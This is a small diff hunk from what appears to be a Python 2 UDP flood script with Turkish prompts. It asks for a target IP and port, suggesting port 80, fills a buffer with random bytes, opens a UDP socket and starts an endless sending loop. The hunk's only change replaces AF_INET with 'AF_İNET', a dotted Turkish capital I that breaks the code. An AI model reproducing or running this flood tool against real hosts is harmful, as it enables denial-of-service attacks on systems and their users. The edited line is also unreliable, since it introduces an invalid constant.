@@ -15,7 +15,7 @@ ip=raw_input("Hedef İp Adresini Giriniz: ")
 port=input("Portu Giriniz. Porta 80 Değerini Girmeniz Önerilir.")  
 
 bytes=random._urandom(8000)
-sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+sock=socket.socket(socket.AF_İNET,socket.SOCK_DGRAM)
 
 sayac=0
 while True:
